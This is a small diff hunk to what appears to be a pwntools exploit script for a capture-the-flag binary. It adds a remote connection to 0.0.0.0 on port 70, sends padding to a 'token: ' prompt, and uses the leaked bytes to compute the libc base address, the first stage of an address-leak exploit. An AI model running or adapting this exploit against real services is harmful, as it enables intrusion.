@@ -56,6 +56,7 @@ context(
 )
 libc = ELF('./libc.so.6')
 
+io = remote('0.0.0.0', 70)
 io.sendafter(b'token: ', b'a' * 0x28)
 io.recvuntil(b'a' * 0x28)
 libc.address = u64(io.recv(0x6).ljust(0x8, b'\x00')) - 0xADDAE
